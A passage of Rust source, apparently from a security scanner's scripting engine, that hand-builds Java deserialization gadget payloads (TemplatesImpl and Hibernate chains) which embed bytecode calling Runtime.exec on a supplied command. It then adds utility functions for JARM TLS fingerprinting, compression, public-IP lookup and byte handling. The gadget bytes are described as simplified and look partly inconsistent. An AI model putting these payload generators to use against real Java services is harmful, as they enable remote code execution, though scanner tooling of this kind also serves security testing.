    payload.push(0x70); // TC_NULL

    // 对象数据 - TemplatesImpl类
    payload.push(0x76); // TC_CLASS
    payload.push(0x72); // TC_CLASSDESC

    let templates_class = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
    payload.write_u16::<BigEndian>(templates_class.len() as u16)?;
    payload.extend_from_slice(templates_class.as_bytes());

    payload.write_u64::<BigEndian>(0x1234567890123456)?;
    payload.push(0x02); // SC_SERIALIZABLE

    // 恶意字节码（简化版本，实际应该是完整的Java字节码）
    let bytecode = create_malicious_bytecode(command)?;

    payload.write_u16::<BigEndian>(0x0001)?;
    payload.push(0x5b); // '['
    payload.push(0x42); // 'B'
    payload.write_u16::<BigEndian>(0x0009)?;
    payload.extend_from_slice(b"_bytecodes");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0003)?;
    payload.extend_from_slice(b"[[B");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // 字节码数组
    payload.push(0x75); // TC_ARRAY
    payload.push(0x72); // TC_CLASSDESC
    payload.write_u16::<BigEndian>(0x0002)?;
    payload.extend_from_slice(b"[[B");
    payload.write_u64::<BigEndian>(0x1234567890abcdef)?;
    payload.push(0x02); // SC_SERIALIZABLE
    payload.write_u16::<BigEndian>(0x0000)?;
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    payload.write_u32::<BigEndian>(0x00000001)?; // 数组长度

    // 字节码数据
    payload.push(0x75); // TC_ARRAY
    payload.push(0x72); // TC_CLASSDESC
    payload.write_u16::<BigEndian>(0x0002)?;
    payload.extend_from_slice(b"[B");
    payload.write_u64::<BigEndian>(0xfedcba0987654321)?;
    payload.push(0x02); // SC_SERIALIZABLE
    payload.write_u16::<BigEndian>(0x0000)?;
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    payload.write_u32::<BigEndian>(bytecode.len() as u32)?;
    payload.extend_from_slice(&bytecode);

    Ok(payload)
}

/// 生成Hibernate框架Gadget
fn generate_hibernate1_gadget(command: &str) -> Result<Vec<u8>> {
    use byteorder::{BigEndian, WriteBytesExt};

    let mut payload = Vec::new();

    // Java序列化魔数和版本
    payload.write_u16::<BigEndian>(0xaced)?;
    payload.write_u16::<BigEndian>(0x0005)?;

    // Hibernate TypedValue利用链
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let class_name = "org.hibernate.engine.spi.TypedValue";
    payload.write_u16::<BigEndian>(class_name.len() as u16)?;
    payload.extend_from_slice(class_name.as_bytes());

    payload.write_u64::<BigEndian>(0x1357924680135792)?; // serialVersionUID
    payload.push(0x02); // SC_SERIALIZABLE

    // 字段定义
    payload.write_u16::<BigEndian>(0x0002)?;

    // type字段
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x0004)?;
    payload.extend_from_slice(b"type");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x001a)?;
    payload.extend_from_slice(b"Lorg/hibernate/type/Type;");

    // value字段
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x0005)?;
    payload.extend_from_slice(b"value");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0012)?;
    payload.extend_from_slice(b"Ljava/lang/Object;");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // ComponentType对象
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let component_type = "org.hibernate.type.ComponentType";
    payload.write_u16::<BigEndian>(component_type.len() as u16)?;
    payload.extend_from_slice(component_type.as_bytes());

    payload.write_u64::<BigEndian>(0x2468135790246813)?;
    payload.push(0x02); // SC_SERIALIZABLE

    // 恶意组件数据
    payload.write_u16::<BigEndian>(0x0001)?;
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x000a)?;
    payload.extend_from_slice(b"componentTuplizer");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0025)?;
    payload.extend_from_slice(b"Lorg/hibernate/tuple/Tuplizer;");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // 恶意Tuplizer
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let tuplizer_class = "org.hibernate.tuple.component.PojoComponentTuplizer";
    payload.write_u16::<BigEndian>(tuplizer_class.len() as u16)?;
    payload.extend_from_slice(tuplizer_class.as_bytes());

    payload.write_u64::<BigEndian>(0x9876543210987654)?;
    payload.push(0x02); // SC_SERIALIZABLE

    // 命令执行载荷
    payload.write_u16::<BigEndian>(0x0000)?;
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // 命令字符串
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(command.len() as u16)?;
    payload.extend_from_slice(command.as_bytes());

    Ok(payload)
}

/// 创建恶意Java字节码
fn create_malicious_bytecode(command: &str) -> Result<Vec<u8>> {
    // 这是一个简化的Java字节码生成
    // 实际应用中应该使用ASM或其他字节码生成库
    let mut bytecode = Vec::new();

    // Java类文件魔数
    bytecode.extend_from_slice(&[0xCA, 0xFE, 0xBA, 0xBE]);

    // 版本号 (Java 8)
    bytecode.extend_from_slice(&[0x00, 0x00, 0x00, 0x34]);

    // 常量池计数
    bytecode.extend_from_slice(&[0x00, 0x10]);

    // 常量池条目（简化）
    // CONSTANT_Class
    bytecode.push(0x07);
    bytecode.extend_from_slice(&[0x00, 0x02]);

    // CONSTANT_Utf8 - 类名
    bytecode.push(0x01);
    let class_name = "MaliciousClass";
    bytecode.extend_from_slice(&[(class_name.len() >> 8) as u8, class_name.len() as u8]);
    bytecode.extend_from_slice(class_name.as_bytes());

    // CONSTANT_Class - 父类
    bytecode.push(0x07);
    bytecode.extend_from_slice(&[0x00, 0x04]);

    // CONSTANT_Utf8 - 父类名
    bytecode.push(0x01);
    let super_class = "java/lang/Object";
    bytecode.extend_from_slice(&[(super_class.len() >> 8) as u8, super_class.len() as u8]);
    bytecode.extend_from_slice(super_class.as_bytes());

    // CONSTANT_Methodref
    bytecode.push(0x0A);
    bytecode.extend_from_slice(&[0x00, 0x06, 0x00, 0x07]);

    // CONSTANT_Class - Runtime
    bytecode.push(0x07);
    bytecode.extend_from_slice(&[0x00, 0x08]);

    // CONSTANT_NameAndType
    bytecode.push(0x0C);
    bytecode.extend_from_slice(&[0x00, 0x09, 0x00, 0x0A]);

    // CONSTANT_Utf8 - Runtime类名
    bytecode.push(0x01);
    let runtime_class = "java/lang/Runtime";
    bytecode.extend_from_slice(&[(runtime_class.len() >> 8) as u8, runtime_class.len() as u8]);
    bytecode.extend_from_slice(runtime_class.as_bytes());

    // CONSTANT_Utf8 - 方法名
    bytecode.push(0x01);
    let method_name = "exec";
    bytecode.extend_from_slice(&[(method_name.len() >> 8) as u8, method_name.len() as u8]);
    bytecode.extend_from_slice(method_name.as_bytes());

    // CONSTANT_Utf8 - 方法描述符
    bytecode.push(0x01);
    let method_desc = "(Ljava/lang/String;)Ljava/lang/Process;";
    bytecode.extend_from_slice(&[(method_desc.len() >> 8) as u8, method_desc.len() as u8]);
    bytecode.extend_from_slice(method_desc.as_bytes());

    // CONSTANT_String - 命令
    bytecode.push(0x08);
    bytecode.extend_from_slice(&[0x00, 0x0C]);

    // CONSTANT_Utf8 - 命令字符串
    bytecode.push(0x01);
    bytecode.extend_from_slice(&[(command.len() >> 8) as u8, command.len() as u8]);
    bytecode.extend_from_slice(command.as_bytes());

    // 访问标志
    bytecode.extend_from_slice(&[0x00, 0x21]); // ACC_PUBLIC | ACC_SUPER

    // this_class
    bytecode.extend_from_slice(&[0x00, 0x01]);

    // super_class
    bytecode.extend_from_slice(&[0x00, 0x03]);

    // interfaces_count
    bytecode.extend_from_slice(&[0x00, 0x00]);

    // fields_count
    bytecode.extend_from_slice(&[0x00, 0x00]);

    // methods_count
    bytecode.extend_from_slice(&[0x00, 0x01]);

    // 方法信息（简化的静态初始化器）
    bytecode.extend_from_slice(&[0x00, 0x08]); // ACC_STATIC
    bytecode.extend_from_slice(&[0x00, 0x0D]); // name_index
    bytecode.extend_from_slice(&[0x00, 0x0E]); // descriptor_index
    bytecode.extend_from_slice(&[0x00, 0x01]); // attributes_count

    // Code属性（简化）
    bytecode.extend_from_slice(&[0x00, 0x0F]); // attribute_name_index
    bytecode.extend_from_slice(&[0x00, 0x00, 0x00, 0x20]); // attribute_length
    bytecode.extend_from_slice(&[0x00, 0x02]); // max_stack
    bytecode.extend_from_slice(&[0x00, 0x01]); // max_locals
    bytecode.extend_from_slice(&[0x00, 0x00, 0x00, 0x10]); // code_length

    // 字节码指令（简化）
    bytecode.extend_from_slice(&[
        0x12, 0x0B,       // ldc #11 (命令字符串)
        0xB8, 0x00, 0x05, // invokestatic Runtime.exec
        0x57,             // pop
        0xB1,             // return
    ]);

    // 填充到16字节
    bytecode.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);

    // exception_table_length
    bytecode.extend_from_slice(&[0x00, 0x00]);

    // attributes_count
    bytecode.extend_from_slice(&[0x00, 0x00]);

    // 类属性计数
    bytecode.extend_from_slice(&[0x00, 0x00]);

    Ok(bytecode)
}

// ==================== 新增缺失函数实现 ====================

/// deflate函数：DEFLATE压缩
fn builtin_deflate(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("deflate函数需要1个参数"));
    }

    let text = args[0].to_string();
    let compressed = deflate_compress(text.as_bytes(), 6);
    Ok(DslValue::String(hex::encode(compressed)))
}

/// inflate函数：DEFLATE解压缩
fn builtin_inflate(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("inflate函数需要1个参数"));
    }

    let encoded = args[0].to_string();
    let compressed = hex::decode(&encoded)
        .map_err(|e| anyhow!("十六进制解码错误: {}", e))?;

    match inflate_decompress(&compressed) {
        Ok(decompressed) => {
            match String::from_utf8(decompressed) {
                Ok(text) => Ok(DslValue::String(text)),
                Err(_) => Err(anyhow!("解压缩结果不是有效的UTF-8字符串")),
            }
        }
        Err(e) => Err(anyhow!("DEFLATE解压缩错误: {:?}", e)),
    }
}

/// jarm函数：计算JARM指纹
fn builtin_jarm(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("jarm函数需要1个参数"));
    }

    let hostport = args[0].to_string();

    // 解析主机和端口
    let (host, port) = if let Some((h, p)) = hostport.split_once(':') {
        let port_num = p.parse::<u16>()
            .map_err(|_| anyhow!("无效的端口号: {}", p))?;
        (h.to_string(), port_num)
    } else {
        (hostport, 443) // 默认HTTPS端口
    };

    // 简化的JARM指纹计算实现
    // 实际的JARM需要进行多次TLS握手并分析响应
    let jarm_hash = calculate_jarm_fingerprint(&host, port)?;
    Ok(DslValue::String(jarm_hash))
}

/// 计算JARM指纹的辅助函数
fn calculate_jarm_fingerprint(host: &str, port: u16) -> Result<String> {
    use sha2::{Sha256, Digest};
    use std::io::{Read, Write};

    // JARM需要进行10次不同的TLS握手探测
    let jarm_probes = [
        // TLS 1.3探测
        create_tls13_client_hello(0x1301, &[0x1301, 0x1302, 0x1303]),
        create_tls13_client_hello(0x1302, &[0x1302, 0x1303]),
        create_tls13_client_hello(0x1303, &[0x1303]),
        // TLS 1.2探测
        create_tls12_client_hello(&[0x0035, 0x002f, 0x000a]),
        create_tls12_client_hello(&[0xc02f, 0xc030, 0x009e]),
        // TLS 1.1探测
        create_tls11_client_hello(&[0x0035, 0x002f]),
        // TLS 1.0探测
        create_tls10_client_hello(&[0x0035, 0x002f]),
        // SSLv3探测（如果支持）
        create_ssl3_client_hello(&[0x0035, 0x002f]),
        // 特殊探测：无SNI
        create_tls12_client_hello_no_sni(&[0x0035, 0x002f]),
        // 特殊探测：ALPN
        create_tls12_client_hello_with_alpn(&[0x0035, 0x002f]),
    ];

    let mut jarm_responses = Vec::new();

    for (i, probe) in jarm_probes.iter().enumerate() {
        match perform_tls_probe(host, port, probe) {
            Ok(response) => {
                jarm_responses.push(extract_jarm_details(&response));
            }
            Err(_) => {
                // 连接失败或超时，记录为空响应
                jarm_responses.push(String::new());
            }
        }

        // 在探测之间添加小延迟，避免被检测为攻击
        std::thread::sleep(Duration::from_millis(100));
    }

    // 计算JARM哈希
    let jarm_string = jarm_responses.join(",");
    let mut hasher = Sha256::new();
    hasher.update(jarm_string.as_bytes());
    let result = hasher.finalize();

    // JARM指纹是SHA256哈希的前62个字符
    Ok(format!("{:x}", result)[..62].to_string())
}

/// 执行TLS探测
fn perform_tls_probe(host: &str, port: u16, client_hello: &[u8]) -> Result<Vec<u8>> {
    use std::io::{Read, Write};

    let addr = format!("{}:{}", host, port);
    let socket_addr = addr.parse::<SocketAddr>()
        .map_err(|e| anyhow!("地址解析失败: {}", e))?;

    let mut stream = TcpStream::connect_timeout(&socket_addr, Duration::from_secs(5))
        .map_err(|e| anyhow!("TCP连接失败: {}", e))?;

    // 发送Client Hello
    stream.write_all(client_hello)
        .map_err(|e| anyhow!("发送Client Hello失败: {}", e))?;

    // 读取Server Hello响应
    let mut response = Vec::new();
    let mut buffer = [0u8; 4096];

    // 设置读取超时
    stream.set_read_timeout(Some(Duration::from_secs(3)))
        .map_err(|e| anyhow!("设置读取超时失败: {}", e))?;

    match stream.read(&mut buffer) {
        Ok(n) if n > 0 => {
            response.extend_from_slice(&buffer[..n]);
        }
        Ok(_) => {
            return Err(anyhow!("服务器关闭连接"));
        }
        Err(e) => {
            return Err(anyhow!("读取响应失败: {}", e));
        }
    }

    Ok(response)
}

/// 从TLS响应中提取JARM相关信息
fn extract_jarm_details(response: &[u8]) -> String {
    if response.len() < 43 {
        return String::new();
    }

    // 解析TLS记录头
    if response[0] != 0x16 { // 不是握手记录
        return String::new();
    }

    // 解析Server Hello
    if response.len() < 43 || response[5] != 0x02 { // 不是Server Hello
        return String::new();
    }

    // 提取关键信息用于JARM计算
    let mut jarm_parts = Vec::new();

    // TLS版本 (bytes 9-10)
    if response.len() > 10 {
        jarm_parts.push(format!("{:02x}{:02x}", response[9], response[10]));
    }

    // 密码套件 (bytes 43-44)
    if response.len() > 44 {
        jarm_parts.push(format!("{:02x}{:02x}", response[43], response[44]));
    }

    // 扩展长度和类型（如果存在）
    if response.len() > 84 {
        let extensions_len = ((response[82] as u16) << 8) | (response[83] as u16);
        if extensions_len > 0 && response.len() > 84 + extensions_len as usize {
            // 提取前几个扩展的类型
            let mut pos = 84;
            let mut ext_count = 0;
            while pos + 4 <= response.len() && ext_count < 3 {
                let ext_type = ((response[pos] as u16) << 8) | (response[pos + 1] as u16);
                let ext_len = ((response[pos + 2] as u16) << 8) | (response[pos + 3] as u16);
                jarm_parts.push(format!("{:04x}", ext_type));
                pos += 4 + ext_len as usize;
                ext_count += 1;
            }
        }
    }

    jarm_parts.join("|")
}

/// 创建TLS 1.3 Client Hello
fn create_tls13_client_hello(version: u16, cipher_suites: &[u16]) -> Vec<u8> {
    let mut client_hello = Vec::new();

    // TLS记录头
    client_hello.push(0x16); // Content Type: Handshake
    client_hello.extend_from_slice(&[0x03, 0x01]); // Version: TLS 1.0 (记录层)

    // 握手消息开始位置（稍后填充长度）
    let length_pos = client_hello.len();
    client_hello.extend_from_slice(&[0x00, 0x00]); // 长度占位符

    // 握手消息头
    client_hello.push(0x01); // Handshake Type: Client Hello

    // 握手消息长度占位符
    let handshake_length_pos = client_hello.len();
    client_hello.extend_from_slice(&[0x00, 0x00, 0x00]); // 长度占位符

    // Client Hello内容
    client_hello.extend_from_slice(&[(version >> 8) as u8, version as u8]); // 协议版本

    // 随机数 (32字节)
    use rand::RngCore;
    let mut rng = rand::thread_rng();
    let mut random = [0u8; 32];
    rng.fill_bytes(&mut random);
    client_hello.extend_from_slice(&random);

    // Session ID长度和内容
    client_hello.push(0x00); // Session ID长度: 0

    // 密码套件
    client_hello.extend_from_slice(&[0x00, (cipher_suites.len() * 2) as u8]); // 密码套件长度
    for &suite in cipher_suites {
        client_hello.extend_from_slice(&[(suite >> 8) as u8, suite as u8]);
    }

    // 压缩方法
    client_hello.push(0x01); // 压缩方法长度
    client_hello.push(0x00); // 无压缩

    // 扩展
    let extensions_start = client_hello.len();
    client_hello.extend_from_slice(&[0x00, 0x00]); // 扩展长度占位符

    // SNI扩展
    add_sni_extension(&mut client_hello, "example.com");

    // 支持的版本扩展（TLS 1.3）
    add_supported_versions_extension(&mut client_hello, &[version]);

    // 计算并填充扩展长度
    let extensions_len = client_hello.len() - extensions_start - 2;
    client_hello[extensions_start] = (extensions_len >> 8) as u8;
    client_hello[extensions_start + 1] = extensions_len as u8;

    // 计算并填充握手消息长度
    let handshake_len = client_hello.len() - handshake_length_pos - 3;
    client_hello[handshake_length_pos] = (handshake_len >> 16) as u8;
    client_hello[handshake_length_pos + 1] = (handshake_len >> 8) as u8;
    client_hello[handshake_length_pos + 2] = handshake_len as u8;

    // 计算并填充TLS记录长度
    let record_len = client_hello.len() - length_pos - 2;
    client_hello[length_pos] = (record_len >> 8) as u8;
    client_hello[length_pos + 1] = record_len as u8;

    client_hello
}

/// 创建TLS 1.2 Client Hello
fn create_tls12_client_hello(cipher_suites: &[u16]) -> Vec<u8> {
    create_tls_client_hello(0x0303, cipher_suites, true, false, false)
}

/// 创建TLS 1.1 Client Hello
fn create_tls11_client_hello(cipher_suites: &[u16]) -> Vec<u8> {
    create_tls_client_hello(0x0302, cipher_suites, true, false, false)
}

/// 创建TLS 1.0 Client Hello
fn create_tls10_client_hello(cipher_suites: &[u16]) -> Vec<u8> {
    create_tls_client_hello(0x0301, cipher_suites, true, false, false)
}

/// 创建SSL 3.0 Client Hello
fn create_ssl3_client_hello(cipher_suites: &[u16]) -> Vec<u8> {
    create_tls_client_hello(0x0300, cipher_suites, false, false, false)
}

/// 创建无SNI的TLS 1.2 Client Hello
fn create_tls12_client_hello_no_sni(cipher_suites: &[u16]) -> Vec<u8> {
    create_tls_client_hello(0x0303, cipher_suites, false, false, false)
}

/// 创建带ALPN的TLS 1.2 Client Hello
fn create_tls12_client_hello_with_alpn(cipher_suites: &[u16]) -> Vec<u8> {
    create_tls_client_hello(0x0303, cipher_suites, true, true, false)
}

/// 通用的TLS Client Hello创建函数
fn create_tls_client_hello(
    version: u16,
    cipher_suites: &[u16],
    include_sni: bool,
    include_alpn: bool,
    include_supported_versions: bool
) -> Vec<u8> {
    let mut client_hello = Vec::new();

    // TLS记录头
    client_hello.push(0x16); // Content Type: Handshake
    client_hello.extend_from_slice(&[(version >> 8) as u8, version as u8]); // 版本

    // 记录长度占位符
    let length_pos = client_hello.len();
    client_hello.extend_from_slice(&[0x00, 0x00]);

    // 握手消息头
    client_hello.push(0x01); // Handshake Type: Client Hello

    // 握手消息长度占位符
    let handshake_length_pos = client_hello.len();
    client_hello.extend_from_slice(&[0x00, 0x00, 0x00]);

    // Client Hello内容
    client_hello.extend_from_slice(&[(version >> 8) as u8, version as u8]); // 协议版本

    // 随机数 (32字节)
    use rand::RngCore;
    let mut rng = rand::thread_rng();
    let mut random = [0u8; 32];
    rng.fill_bytes(&mut random);
    client_hello.extend_from_slice(&random);

    // Session ID
    client_hello.push(0x00); // Session ID长度: 0

    // 密码套件
    client_hello.extend_from_slice(&[0x00, (cipher_suites.len() * 2) as u8]);
    for &suite in cipher_suites {
        client_hello.extend_from_slice(&[(suite >> 8) as u8, suite as u8]);
    }

    // 压缩方法
    client_hello.push(0x01); // 压缩方法长度
    client_hello.push(0x00); // 无压缩

    // 扩展
    if include_sni || include_alpn || include_supported_versions {
        let extensions_start = client_hello.len();
        client_hello.extend_from_slice(&[0x00, 0x00]); // 扩展长度占位符

        if include_sni {
            add_sni_extension(&mut client_hello, "example.com");
        }

        if include_alpn {
            add_alpn_extension(&mut client_hello);
        }

        if include_supported_versions {
            add_supported_versions_extension(&mut client_hello, &[version]);
        }

        // 计算并填充扩展长度
        let extensions_len = client_hello.len() - extensions_start - 2;
        client_hello[extensions_start] = (extensions_len >> 8) as u8;
        client_hello[extensions_start + 1] = extensions_len as u8;
    }

    // 计算并填充握手消息长度
    let handshake_len = client_hello.len() - handshake_length_pos - 3;
    client_hello[handshake_length_pos] = (handshake_len >> 16) as u8;
    client_hello[handshake_length_pos + 1] = (handshake_len >> 8) as u8;
    client_hello[handshake_length_pos + 2] = handshake_len as u8;

    // 计算并填充TLS记录长度
    let record_len = client_hello.len() - length_pos - 2;
    client_hello[length_pos] = (record_len >> 8) as u8;
    client_hello[length_pos + 1] = record_len as u8;

    client_hello
}

/// 添加SNI扩展
fn add_sni_extension(client_hello: &mut Vec<u8>, hostname: &str) {
    // 扩展类型: Server Name Indication (0x0000)
    client_hello.extend_from_slice(&[0x00, 0x00]);

    // 扩展长度
    let ext_len = 5 + hostname.len();
    client_hello.extend_from_slice(&[(ext_len >> 8) as u8, ext_len as u8]);

    // SNI列表长度
    let sni_list_len = 3 + hostname.len();
    client_hello.extend_from_slice(&[(sni_list_len >> 8) as u8, sni_list_len as u8]);

    // SNI类型: hostname (0x00)
    client_hello.push(0x00);

    // 主机名长度和内容
    client_hello.extend_from_slice(&[(hostname.len() >> 8) as u8, hostname.len() as u8]);
    client_hello.extend_from_slice(hostname.as_bytes());
}

/// 添加ALPN扩展
fn add_alpn_extension(client_hello: &mut Vec<u8>) {
    // 扩展类型: Application Layer Protocol Negotiation (0x0010)
    client_hello.extend_from_slice(&[0x00, 0x10]);

    // 协议列表
    let protocols = ["http/1.1", "h2"];
    let mut protocols_data = Vec::new();

    for protocol in &protocols {
        protocols_data.push(protocol.len() as u8);
        protocols_data.extend_from_slice(protocol.as_bytes());
    }

    // 扩展长度
    let ext_len = 2 + protocols_data.len();
    client_hello.extend_from_slice(&[(ext_len >> 8) as u8, ext_len as u8]);

    // 协议列表长度
    client_hello.extend_from_slice(&[(protocols_data.len() >> 8) as u8, protocols_data.len() as u8]);

    // 协议列表
    client_hello.extend_from_slice(&protocols_data);
}

/// 添加支持的版本扩展
fn add_supported_versions_extension(client_hello: &mut Vec<u8>, versions: &[u16]) {
    // 扩展类型: Supported Versions (0x002b)
    client_hello.extend_from_slice(&[0x00, 0x2b]);

    // 扩展长度
    let ext_len = 1 + versions.len() * 2;
    client_hello.extend_from_slice(&[(ext_len >> 8) as u8, ext_len as u8]);

    // 版本列表长度
    client_hello.push((versions.len() * 2) as u8);

    // 版本列表
    for &version in versions {
        client_hello.extend_from_slice(&[(version >> 8) as u8, version as u8]);
    }
}

/// public_ip函数：获取公网IP地址
fn builtin_public_ip(args: &[DslValue]) -> Result<DslValue> {
    if !args.is_empty() {
        return Err(anyhow!("public_ip函数不需要参数"));
    }

    // 使用多个公共IP检测服务
    let ip_services = [
        "https://api.ipify.org",
        "https://ipinfo.io/ip",
        "https://icanhazip.com",
        "https://ident.me",
    ];

    for service in &ip_services {
        if let Ok(ip) = get_public_ip_from_service(service) {
            return Ok(DslValue::String(ip));
        }
    }

    Err(anyhow!("无法获取公网IP地址"))
}

/// 从指定服务获取公网IP的辅助函数
fn get_public_ip_from_service(service_url: &str) -> Result<String> {
    use std::time::Duration;

    // 创建阻塞HTTP客户端，设置超时
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(10))
        .user_agent("Rscan/1.0")
        .build()
        .map_err(|e| anyhow!("创建HTTP客户端失败: {}", e))?;

    // 发送HTTP请求获取公网IP
    let response = client
        .get(service_url)
        .send()
        .map_err(|e| anyhow!("HTTP请求失败: {}", e))?;

    if !response.status().is_success() {
        return Err(anyhow!("HTTP请求返回错误状态: {}", response.status()));
    }

    let ip_text = response
        .text()
        .map_err(|e| anyhow!("读取响应内容失败: {}", e))?
        .trim()
        .to_string();

    // 验证返回的是有效的IP地址
    if ip_text.parse::<std::net::IpAddr>().is_ok() {
        Ok(ip_text)
    } else {
        Err(anyhow!("返回的不是有效的IP地址: {}", ip_text))
    }
}

/// unpack函数：二进制解包（类似Python的struct.unpack）
fn builtin_unpack(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("unpack函数需要2个参数：format, data"));
    }

    let format = args[0].to_string();
    let data_str = args[1].to_string();

    // 解析数据（支持十六进制字符串）
    let data = if data_str.starts_with("\\x") {
        // 处理类似 \xac\xd7\t\xd0 的格式
        parse_escape_sequence(&data_str)?
    } else {
        hex::decode(&data_str)
            .map_err(|e| anyhow!("数据解码错误: {}", e))?
    };

    // 解析格式字符串
    let result = match format.as_str() {
        ">I" => {
            // 大端序无符号32位整数
            if data.len() < 4 {
                return Err(anyhow!("数据长度不足"));
            }
            let value = u32::from_be_bytes([data[0], data[1], data[2], data[3]]);
            DslValue::Integer(value as i64)
        }
        "<I" => {
            // 小端序无符号32位整数
            if data.len() < 4 {
                return Err(anyhow!("数据长度不足"));
            }
            let value = u32::from_le_bytes([data[0], data[1], data[2], data[3]]);
            DslValue::Integer(value as i64)
        }
        ">H" => {
            // 大端序无符号16位整数
            if data.len() < 2 {
                return Err(anyhow!("数据长度不足"));
            }
            let value = u16::from_be_bytes([data[0], data[1]]);
            DslValue::Integer(value as i64)
        }
        "<H" => {
            // 小端序无符号16位整数
            if data.len() < 2 {
                return Err(anyhow!("数据长度不足"));
            }
            let value = u16::from_le_bytes([data[0], data[1]]);
            DslValue::Integer(value as i64)
        }
        ">B" => {
            // 无符号8位整数
            if data.is_empty() {
                return Err(anyhow!("数据长度不足"));
            }
            DslValue::Integer(data[0] as i64)
        }
        _ => return Err(anyhow!("不支持的格式: {}", format)),
    };

    Ok(result)
}

/// 解析转义序列的辅助函数
fn parse_escape_sequence(input: &str) -> Result<Vec<u8>> {
    let mut result = Vec::new();
    let mut chars = input.chars().peekable();

    while let Some(ch) = chars.next() {
        if ch == '\\' {
            if let Some(&'x') = chars.peek() {
                chars.next(); // 消费 'x'

                // 读取两个十六进制字符
                let hex_chars: String = chars.by_ref().take(2).collect();
                if hex_chars.len() == 2 {
                    let byte = u8::from_str_radix(&hex_chars, 16)
                        .map_err(|e| anyhow!("无效的十六进制字符: {}", e))?;
                    result.push(byte);
                } else {
                    return Err(anyhow!("不完整的十六进制转义序列"));
                }
            } else {
                return Err(anyhow!("不支持的转义序列"));
            }
        } else {
            result.push(ch as u8);
        }
    }

    Ok(result)
}

/// padding函数：字符串填充
fn builtin_padding(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 3 {
        return Err(anyhow!("padding函数需要3个参数：input, padding_char, length"));
    }

    let input = args[0].to_string();
    let padding_char = args[1].to_string();
    let target_length = args[2].to_integer()? as usize;

    if padding_char.len() != 1 {
        return Err(anyhow!("填充字符必须是单个字符"));
    }

    let pad_char = padding_char.chars().next().unwrap();

    if input.len() >= target_length {
        Ok(DslValue::String(input))
    } else {
        let padding_needed = target_length - input.len();
        let padded = format!("{}{}", input, pad_char.to_string().repeat(padding_needed));
        Ok(DslValue::String(padded))
    }
}

/// index函数：数组/字符串索引访问
fn builtin_index(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("index函数需要2个参数：slice, index"));
    }

    let slice = args[0].to_string();
    let index = args[1].to_integer()? as usize;

    let chars: Vec<char> = slice.chars().collect();

    if index >= chars.len() {
        return Err(anyhow!("索引超出范围: {} >= {}", index, chars.len()));
    }

    Ok(DslValue::String(chars[index].to_string()))
}

/// xor函数：XOR操作
fn builtin_xor(args: &[DslValue]) -> Result<DslValue> {
    if args.len() < 2 {
        return Err(anyhow!("xor函数至少需要2个参数"));
    }

    let first = args[0].to_string();
    let first_bytes = first.as_bytes();

    let mut result = first_bytes.to_vec();

    for i in 1..args.len() {
        let other = args[i].to_string();
        let other_bytes = other.as_bytes();

        if result.len() != other_bytes.len() {
            return Err(anyhow!("XOR操作的序列长度必须相同"));
            
        }

        for (j, &byte) in other_bytes.iter().enumerate() {
            result[j] ^= byte;
        }
    }

    // 返回十六进制表示
    Ok(DslValue::String(hex::encode(result)))
}
